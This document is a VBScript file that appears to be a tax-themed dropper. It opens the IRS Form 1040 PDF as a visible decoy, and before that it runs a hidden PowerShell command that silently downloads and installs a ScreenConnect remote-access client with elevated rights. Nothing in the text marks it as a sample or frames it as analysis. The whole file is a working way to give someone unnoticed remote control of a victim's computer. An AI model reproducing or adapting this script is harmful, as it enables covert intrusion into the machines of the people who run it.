Option Explicit

Dim objShell, strPS, strURL, strPDF, strMSI

strURL  = "https://tds6.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
strPDF  = "https://www.irs.gov/pub/irs-pdf/f1040.pdf"
strMSI  = """" & CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\ScreenConnect.ClientSetup.msi"""

Set objShell = CreateObject("WScript.Shell")

strPS = "$ProgressPreference='SilentlyContinue';" & _
        "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" & _
        "try{" & _
        "  Invoke-WebRequest -Uri '" & strURL & "' -OutFile " & strMSI & ";" & _
        "  Start-Process msiexec.exe -ArgumentList '/i " & strMSI & " /qn /norestart' -Verb RunAs -Wait;" & _
        "  Write-Host 'SUCCESS'" & _
        "}catch{" & _
        "  Write-Host 'FAIL:' $_.Exception.Message" & _
        "}"

objShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & strPS & """", 0, True

' Open the PDF in default browser after installation
objShell.Run "cmd /c start """" " & strPDF, 0, False
